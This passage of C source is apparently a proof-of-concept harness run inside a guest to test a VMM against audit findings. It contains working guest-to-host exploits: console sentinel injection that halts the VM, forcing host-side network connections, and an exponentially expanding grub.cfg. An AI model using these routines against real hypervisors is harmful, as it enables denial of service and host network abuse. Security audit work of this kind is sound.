	say("MARK blk-kick segments=%u bytes_each=%" PRIu64 " total_mib=%" PRIu64 " requests=%u", nsegs,
	    seglen, (uint64_t)nsegs * seglen >> 20, nreq);
	/* More than one request (the same chain again) keeps the device from
	 * running it on the pump: it then goes to the host as overlapped I/O. */
	for (unsigned i = 0; i < nreq; i++)
		vq_publish(&q, 0);
	vq_kick(&q);
	msleep(settle_ms);
	if (snapshot) {
		uint32_t r[4];
		say("MARK blk-snapshot used_idx=%u status=0x%02x", vq_used_idx(&q), *st);
		msleep(200); /* let the line out before the vCPU stops for good */
		snapshot_trigger(r);
		die("the snapshot trigger returned (ebx=0x%08x ecx=0x%08x): tinyvmm was not started "
		    "with --save",
		    r[1], r[2]);
	}
	say("MARK blk-poweroff used_idx=%u status=0x%02x", vq_used_idx(&q), *st);
	sync();
	reboot(RB_POWER_OFF);
	die("reboot(RB_POWER_OFF): %s", strerror(errno));
}

/* ============================================================= bar-remap */
/* Finding 1's fix, functional: unmapping and remapping a BAR (COMMAND bit 1,
 * and a move) while the kernel's virtio-blk driver owns the device must leave
 * the device working, doorbells included. */

static int blk_rw_check(int fd, uint8_t *buf, uint8_t *back, off_t off, uint32_t seed)
{
	for (unsigned i = 0; i < 4096 / 4; i++)
		put32(buf + 4 * i, seed * 2654435761u + i);
	if (pwrite(fd, buf, 4096, off) != 4096)
		return -1;
	memset(back, 0, 4096);
	if (pread(fd, back, 4096, off) != 4096)
		return -1;
	return memcmp(buf, back, 4096) ? -1 : 0;
}

static int poc_bar_remap(void)
{
	unsigned iters = (unsigned)opt_u64("iters", 300);
	uint64_t away = opt_u64("away", 0xf0000000ull);
	struct vdev d;
	if (vdev_find(&d, PCI_ID_BLK, 0) < 0)
		die("bar-remap: no virtio-blk device");
	vdev_open_cfg(&d);
	/* The kernel's disk on this PCI function. */
	char path[300], disk[64] = "";
	DIR *dir = opendir(d.dir);
	struct dirent *e;
	while (dir && (e = readdir(dir))) {
		if (strncmp(e->d_name, "virtio", 6))
			continue;
		snprintf(path, sizeof path, "%s/%s/block", d.dir, e->d_name);
		DIR *b = opendir(path);
		struct dirent *be;
		while (b && (be = readdir(b)))
			if (be->d_name[0] != '.')
				snprintf(disk, sizeof disk, "/dev/%s", be->d_name);
		if (b)
			closedir(b);
	}
	if (dir)
		closedir(dir);
	if (!disk[0])
		die("bar-remap: the kernel has no disk on %s", d.bdf);
	int fd = open(disk, O_RDWR | O_DIRECT | O_CLOEXEC);
	if (fd < 0)
		die("bar-remap: open %s: %s", disk, strerror(errno));
	uint8_t *buf, *back;
	if (posix_memalign((void **)&buf, 4096, 4096) || posix_memalign((void **)&back, 4096, 4096))
		die("bar-remap: memalign");
	if (blk_rw_check(fd, buf, back, 0, 1) < 0)
		die("bar-remap: I/O fails before anything was touched: %s", strerror(errno));

	uint16_t cmd = (uint16_t)cfg_read(&d, 4, 2);
	unsigned io_ok = 0, io_err = 0;
	double t0 = now_ms();
	for (unsigned i = 1; i <= iters; i++) {
		cfg_write(&d, 4, 2, cmd & ~2u); /* memory decoding off: BAR unmapped */
		cfg_write(&d, 4, 2, cmd | 2u);	/* and on again */
		if (blk_rw_check(fd, buf, back, (off_t)(i % 256) * 4096, i) == 0)
			io_ok++;
		else
			io_err++;
	}
	say("bar-remap: %u COMMAND toggles, I/O after each: ok=%u failed=%u (%.0f ms)", iters, io_ok,
	    io_err, now_ms() - t0);

	/* Move the BAR away and back (64-bit BAR 0 at 0x10/0x14). */
	uint32_t lo = cfg_read(&d, 0x10, 4), hi = cfg_read(&d, 0x14, 4);
	cfg_write(&d, 4, 2, cmd & ~2u);
	cfg_write(&d, 0x10, 4, (uint32_t)away | (lo & 0xf));
	cfg_write(&d, 0x14, 4, (uint32_t)(away >> 32));
	cfg_write(&d, 4, 2, cmd | 2u);
	uint32_t moved_lo = cfg_read(&d, 0x10, 4);
	cfg_write(&d, 4, 2, cmd & ~2u);
	cfg_write(&d, 0x10, 4, lo);
	cfg_write(&d, 0x14, 4, hi);
	cfg_write(&d, 4, 2, cmd | 2u);
	unsigned after_ok = 0, after_err = 0;
	for (unsigned i = 0; i < 32; i++) {
		if (blk_rw_check(fd, buf, back, (off_t)(300 + i) * 4096, 7000 + i) == 0)
			after_ok++;
		else
			after_err++;
	}
	fsync(fd);
	close(fd);
	say("RESULT bar-remap toggles=%u io_ok=%u io_failed=%u bar_was=0x%x bar_moved_to=0x%x "
	    "bar_back=0x%x io_after_move_ok=%u io_after_move_failed=%u",
	    iters, io_ok, io_err, lo, moved_lo, cfg_read(&d, 0x10, 4), after_ok, after_err);
	return 0;
}

/* ============================================================== sentinel */
/* Finding 7: anything that got the sentinel line onto hvc0 stopped the VM. */

static void drop_privileges(void)
{
	if (setgroups(0, NULL) < 0 || setgid(65534) < 0 || setuid(65534) < 0)
		_exit(90);
	if (getuid() != 65534 || geteuid() != 65534 || setuid(0) == 0)
		_exit(91);
}

static int poc_sentinel(void)
{
	const char *mode = opt_str("mode", "stdout");
	mkdir("/tmp", 01777);
	chmod("/tmp", 01777);
	say("sentinel: mode=%s; the next lines come from uid 65534", mode);
	msleep(50);
	pid_t pid = fork();
	if (pid < 0)
		die("fork: %s", strerror(errno));
	if (pid == 0) {
		drop_privileges();
		/* Not root any more: the kernel log is closed to this process. */
		int kfd = open("/dev/kmsg", O_WRONLY);
		int kerr = kfd < 0 ? errno : 0;
		dprintf(1, "[poc] sentinel-child uid=%d euid=%d open(/dev/kmsg) errno=%d\n", getuid(),
			geteuid(), kerr);
		if (!strcmp(mode, "stdout")) {
			/* A process whose stdout is the console, as a login shell's or a
			 * service's is. */
			dprintf(1, "%s\n", SENTINEL);
			_exit(0);
		}
		if (!strcmp(mode, "segv")) {
			/* The kernel names a crashing program's file in its log
			 * ("segfault at ... in <file>[...]"), and a file can be named
			 * anything by whoever may write to /tmp. */
			char path[128], buf[65536];
			snprintf(path, sizeof path, "/tmp/%s", SENTINEL);
			int in = open("/proc/self/exe", O_RDONLY);
			int out = open(path, O_WRONLY | O_CREAT | O_TRUNC, 0755);
			if (in < 0 || out < 0)
				_exit(92);
			ssize_t n;
			while ((n = read(in, buf, sizeof buf)) > 0)
				if (write(out, buf, (size_t)n) != n)
					_exit(93);
			close(in);
			close(out);
			execl(path, path, "segv", (char *)NULL);
			_exit(94);
		}
		if (!strcmp(mode, "tmpfs")) {
			/* The form first suggested: an unknown tmpfs mount option in an
			 * unprivileged user+mount namespace. */
			if (unshare(CLONE_NEWUSER | CLONE_NEWNS) < 0) {
				dprintf(1, "[poc] sentinel-child unshare: %s\n", strerror(errno));
				_exit(95);
			}
			write_file("/proc/self/setgroups", "deny");
			write_file("/proc/self/uid_map", "0 65534 1");
			write_file("/proc/self/gid_map", "0 65534 1");
			int rc = mount("x", "/tmp", "tmpfs", 0, SENTINEL);
			dprintf(1, "[poc] sentinel-child mount(tmpfs, data=sentinel) rc=%d errno=%d\n", rc,
				rc < 0 ? errno : 0);
			char opt[128];
			snprintf(opt, sizeof opt, "x%s", SENTINEL);
			rc = mount("x", "/tmp", "tmpfs", 0, opt);
			dprintf(1, "[poc] sentinel-child mount(tmpfs, data=x+sentinel) rc=%d errno=%d\n",
				rc, rc < 0 ? errno : 0);
			_exit(0);
		}
		_exit(96);
	}
	int status = 0;
	waitpid(pid, &status, 0);
	say("sentinel: child ended, wait status 0x%x%s", status,
	    WIFSIGNALED(status) && WTERMSIG(status) == SIGSEGV ? " (SIGSEGV)" : "");
	msleep(1500);
	say("RESULT sentinel mode=%s still_alive=1", mode);
	return 0;
}

/* ============================================================= net-reach */
/* The user-mode network backends connect, as the host, to where the guest
 * says. Through the kernel's own virtio-net driver: bring eth0 up on the
 * backends' fixed network and fetch a token from ip:port. */

static int poc_net_reach(void)
{
	const char *ip = opt_str("ip", NULL);
	unsigned port = (unsigned)opt_u64("port", 0);
	if (!ip || !port)
		die("net-reach: ip= and port= are required");
	if (system("/bin/busybox ip link set lo up; /bin/busybox ip link set eth0 up && "
		   "/bin/busybox ip addr add 172.29.255.2/29 dev eth0 && "
		   "/bin/busybox ip route add default via 172.29.255.1") != 0)
		die("net-reach: could not configure eth0");
	char buf[512];
	for (int i = 0; i < 50; i++) {
		if (read_file("/sys/class/net/eth0/carrier", buf, sizeof buf) > 0 && buf[0] == '1')
			break;
		msleep(100);
	}
	struct sockaddr_in sa;
	memset(&sa, 0, sizeof sa);
	sa.sin_family = AF_INET;
	sa.sin_port = htons((uint16_t)port);
	if (inet_pton(AF_INET, ip, &sa.sin_addr) != 1)
		die("net-reach: bad ip '%s'", ip);
	int s = socket(AF_INET, SOCK_STREAM | SOCK_CLOEXEC, 0);
	struct timeval tv = { 6, 0 };
	setsockopt(s, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof tv);
	setsockopt(s, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof tv);
	double t0 = now_ms();
	int rc = connect(s, (struct sockaddr *)&sa, sizeof sa);
	int err = rc < 0 ? errno : 0;
	double ms = now_ms() - t0;
	char token[64] = "-";
	if (rc == 0) {
		static const char req[] = "GET /token HTTP/1.0\r\n\r\n";
		ssize_t n = send(s, req, sizeof req - 1, 0);
		size_t got = 0;
		while (n > 0 && got < sizeof buf - 1) {
			n = recv(s, buf + got, sizeof buf - 1 - got, 0);
			if (n > 0)
				got += (size_t)n;
		}
		buf[got] = 0;
		char *body = strstr(buf, "\r\n\r\n");
		if (body) {
			size_t i = 0;
			for (body += 4; *body && *body != '\r' && *body != '\n' && i < sizeof token - 1;
			     body++)
				token[i++] = *body;
			token[i] = 0;
		}
	}
	close(s);
	say("RESULT net-reach target=%s:%u connected=%d errno=%d ms=%.0f token=%s", ip, port, rc == 0,
	    err, ms, token);
	return 0;
}

/* ============================================================ plant-grub */
/* For the host's disk-boot path, which reads the guest's GRUB configuration
 * before the VM starts: put an ext2 filesystem on the disk (through the
 * kernel's own driver) whose grub.cfg has a variable that doubles itself on
 * every line. */

static int poc_plant_grub(void)
{
	unsigned doublings = (unsigned)opt_u64("doublings", 24);
	if (doublings > 40)
		doublings = 40;
	if (system("/bin/busybox mke2fs /dev/vda >/dev/null 2>&1 && "
		   "/bin/busybox mount -t ext2 /dev/vda /mnt && "
		   "/bin/busybox mkdir -p /mnt/boot/grub") != 0)
		die("plant-grub: could not make and mount a filesystem on /dev/vda");
	FILE *f = fopen("/mnt/boot/grub/grub.cfg", "w");
	if (!f)
		die("plant-grub: grub.cfg: %s", strerror(errno));
	fprintf(f, "set a=AAAAAAAAAAAAAAAA\n");
	for (unsigned i = 0; i < doublings; i++)
		fprintf(f, "set a=$a$a\n");
	fprintf(f, "menuentry 'poc' {\n\tlinux /boot/vmlinuz root=/dev/vda1\n}\n");
	long bytes = ftell(f);
	if (fclose(f) != 0)
		die("plant-grub: writing grub.cfg: %s", strerror(errno));
	if (system("/bin/busybox umount /mnt && /bin/busybox sync") != 0)
		die("plant-grub: umount failed");
	say("RESULT plant-grub cfg_bytes=%ld doublings=%u final_value_bytes=%" PRIu64, bytes, doublings,
	    (uint64_t)16 << doublings);
	return 0;
}

/* ================================================================= probe */

static int poc_probe(void)
{
	DIR *dir = opendir("/sys/bus/pci/devices");
	struct dirent *e;
	while (dir && (e = readdir(dir))) {
		if (e->d_name[0] == '.')
			continue;
		char path[300], dev[32] = "", drv[200] = "-", en[8] = "";
		snprintf(path, sizeof path, "/sys/bus/pci/devices/%s/device", e->d_name);
		read_file(path, dev, sizeof dev);
		snprintf(path, sizeof path, "/sys/bus/pci/devices/%s/enable", e->d_name);
		read_file(path, en, sizeof en);
		snprintf(path, sizeof path, "/sys/bus/pci/devices/%s/driver", e->d_name);
		ssize_t n = readlink(path, drv, sizeof drv - 1);
		if (n > 0)
			drv[n] = 0;
		say("probe: %s device=%s enable=%s driver=%s", e->d_name, dev, en, drv);
	}
	if (dir)
		closedir(dir);
	hp_pool_init(2);
	say("probe: hugepage 0 at GPA 0x%" PRIx64 ", 1 at 0x%" PRIx64, g_hp[0].gpa, g_hp[1].gpa);
	struct vdev d;
	if (vdev_find(&d, PCI_ID_RNG, 0) == 0) {
		vdev_takeover(&d);
		vdev_init(&d, 0);
		say("probe: rng %s features=0x%" PRIx64 " notify_mult=%u numq=%u", d.bdf, d.features,
		    d.notify_mult, mr16(d.common + CC_NUMQ));
	}
	say("RESULT probe ok=1");
	return 0;
}

/* ================================================================== main */

int main(int argc, char **argv)
{
	if (argc < 2) {
		dprintf(2, "usage: vhostile <poc> [key=value ...]\n");
		return 64;
	}
	g_argc = argc - 2;
	g_argv = argv + 2;
	const char *poc = argv[1];
	if (!strcmp(poc, "segv")) {
		/* Run as a copy named after the sentinel (see poc_sentinel). */
		volatile int *p = (volatile int *)8;
		*p = 1;
		return 1;
	}
	static const struct {
		const char *name;
		int (*fn)(void);
	} pocs[] = {
		{ "probe", poc_probe },
		{ "avail-bomb", poc_avail_bomb },
		{ "console-flood", poc_console_flood },
		{ "input-status-bomb", poc_input_status_bomb },
		{ "gpu-backing", poc_gpu_backing },
		{ "net-reset-deadlock", poc_net_reset_deadlock },
		{ "p9-flush-order", poc_p9_flush_order },
		{ "p9-flush-stress", poc_p9_flush_stress },
		{ "p9-reset", poc_p9_reset },
		{ "p9-fid-memory", poc_p9_fid_memory },
		{ "blk-whole-disk-stop", poc_blk_whole_disk_stop },
		{ "bar-remap", poc_bar_remap },
		{ "sentinel", poc_sentinel },
		{ "net-reach", poc_net_reach },
		{ "plant-grub", poc_plant_grub },
	};
	for (unsigned i = 0; i < sizeof pocs / sizeof pocs[0]; i++)
		if (!strcmp(poc, pocs[i].name)) {
			int rc = pocs[i].fn();
			say("DONE %s rc=%d kicks=%" PRIu64, poc, rc, g_kicks);
			return rc;
		}
	say("ERROR unknown poc '%s'", poc);
	return 64;
}
